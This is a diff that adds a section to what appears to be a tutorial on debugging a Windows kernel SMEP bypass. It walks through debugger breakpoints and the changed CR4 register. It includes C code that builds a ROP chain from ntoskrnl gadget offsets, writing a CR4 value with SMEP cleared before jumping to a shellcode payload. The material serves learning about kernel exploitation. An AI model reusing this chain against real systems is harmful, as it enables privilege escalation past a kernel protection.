@@ -34,6 +34,52 @@ scoll all the way down and the resault should be:
 ![](/Tutorials/SMEPDEBUG/break1.PNG)
 ![](/Tutorials/SMEPDEBUG/break2.PNG)
 next up type g and hit enter the machine should be running as normal, run the sample exe that i have provided, you should get a break point and this output should go on the debugger:
+![](/Tutorials/SMEPDEBUG/break3.PNG)
+as you can see this break point is different from the one we hit b4. first take a look at the address that triggered the break point: at the break point b4 we hit :<br>
+0xfffff80391595050 cc              int     3<br>
+and now we got:<br>
+Break instruction exception - code 0x80000003 (first chance)
+0x0000017039f00046 cc              int     3<br>
+
+as you can see the first address is a kernel space address and the second a user address. this is becouse i have place xcc in my shellcode. next up open the registers again the outcome should be as follows:<br>
+![](/Tutorials/SMEPDEBUG/break4.PNG)
+you may ask yourself, why is cr4 register changed and how is it that we do not get the bsod msg as b4? well becouse the binary build a rop chain as follows:
+
+```c
+  // To better align the buffer,
+	// it is usefull to declare a
+	// memory structure, other-wise you will get holes
+	// in the buffer and end up with an access violation.
+	typedef struct _RopChain {
+		PUCHAR HvlEndSystemInterrupt;
+		PUCHAR Var;
+		PUCHAR KiEnableXSave;
+		PUCHAR payload;
+		// PUCHAR deviceCallBack;
+	} ROPCHAIN, *PROPCHAIN;
+
+
+  	// Pack The buffer as:  
+
+	ROPCHAIN Chain;
+
+	// nt!HvlEndSystemInterrupt+0x1e --> Pop Rcx; Retn;
+	Chain.HvlEndSystemInterrupt = Ntos + 0x17d970;
+
+	// kd> r cr4
+	// ...1506f8
+	Chain.Var = (PUCHAR)0x506f8;
+
+
+	// nt!KiEnableXSave+0x7472 --> Mov Cr4, Rcx; Retn;
+	Chain.KiEnableXSave = Ntos + 0x434a33;
+
+```
+
+
+
+
+
 
 
 
